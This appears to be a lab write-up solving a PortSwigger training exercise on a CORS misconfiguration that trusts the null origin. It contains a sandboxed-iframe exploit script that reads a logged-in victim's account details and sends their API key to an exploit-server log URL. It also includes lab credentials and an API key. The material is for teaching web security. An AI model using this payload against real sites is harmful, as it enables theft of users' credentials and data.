## Lab Description: CORS vulnerability with trusted null origin

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/b35514b4-f5b4-40b8-9364-615210548520)


## Solution:

### Whitelisted null origin value -

The specification for the Origin header supports the value null. Browsers might send the value null in the Origin header in various unusual situations:

Some applications might whitelist the null origin to support local development of the application. For example, suppose an application receives the following cross-origin request:
```
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```
And the server responds with:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
In this situation, an attacker can use various tricks to generate a cross-origin request containing the value null in the Origin header. This will satisfy the whitelist, leading to cross-domain access. For example, this can be done using a sandboxed iframe cross-origin request of the form:

Login to the website using credentials - wiener:peter.

Once logged in, we can see the API key of wiener.

The GET request to /accountDetails contains `Access-Control-Allow-Credentials` in the response.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/7bfa9ad6-59fb-44eb-90ce-e6c1dd55c590)

 >> Note that there is no Access-Control-Allow-Origin header in response because the Origin header is not specified in the request.

If we give Origin: evil.com in request, we can see that in the response it does not contain any Access-Control-Allow-Origin: evil.com header. Which means evil.com is not in the whitelisted domains.

What happens if we try to give Origin: null in request?

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/68e8343b-ce73-4992-b350-ecd14abbe4bd)

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','0a5000b3043375d0842d91cd0199006b.exploit-server.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='exploit-0a5000b3043375d0842d91cd0199006b.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```


This time we have the Access-Control-Allow-Origin: null header in the response. This means null is in the whitelisted domains.

Some applications might whitelist the null origin to support local development of the application.

So by this we can bypass CORS & retreive the API key of administrator.

Embedding script in iframe -

Scripts that originate from an iframe usually contains Origin: null.

So we need to embed our exploit script inside an iframe.

Script -

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/cc0735cb-bed4-412a-b8f8-e325a09a6a14)

Api Key - n2XSqxeT2bV9R88VgnzWTwCPkaswj6ng


![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/f0570857-d187-48aa-afef-cf23cacc97b8)

Then we can solve this lab.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/4059c93f-2d97-42a1-87d0-3f69ea2b8683)
